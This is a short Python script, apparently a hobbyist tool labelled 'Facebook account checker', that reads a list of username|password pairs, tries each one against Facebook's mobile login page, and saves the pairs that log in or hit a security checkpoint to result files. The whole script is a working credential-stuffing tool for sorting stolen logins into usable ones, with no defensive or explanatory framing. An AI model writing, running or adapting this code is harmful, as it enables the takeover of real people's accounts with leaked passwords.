import requests,os

class ceker:
	def __init__(self):
		self.kun=[]
		self.u='https://mbasic.facebook.com/login'
		self.cek()

	def cek(self):
		try:
			os.mkdir('result')
		except: pass
		print("""
[ Facebook account checker ]
\tIG:fajarid05_
		""")
		try:
			os.mkdir('result/checker')
		except: pass
		print('[*] ext: username,id,email|password')
		fil=input('\n[?] list accounts: ')
		file=open(fil,'r').read().splitlines()
		for i in file:
			self.kun.append(i)
		print()
		for x in self.kun:
			p=x.split('|')
			id=p[0]
			pas=p[1]
			self.login(id,pas)

	def login(self,id,pas):
		rr=requests.post(self.u,data={'email':id,'pass':pas})
		if 'logout.php' in rr.text or 'mbasic_logout_button' in rr.text:
			print(f'[\x1b[32mlive\x1b[37m] {id}|{pas}')
			f=open('result/live.txt','a')
			f.write(f'{id}|{pas}\n')
			f.close()
		elif 'checkpoint' in rr.text:
			print(f'[\x1b[33mcheck\x1b[37m] {id}|{pas}')
			c=open('result/check.txt','a')
			c.write(f'{id}|{pas}\n')
			c.close()

ceker()
print('\n[saved] result/live.txt')
print('[saved] result/check.txt')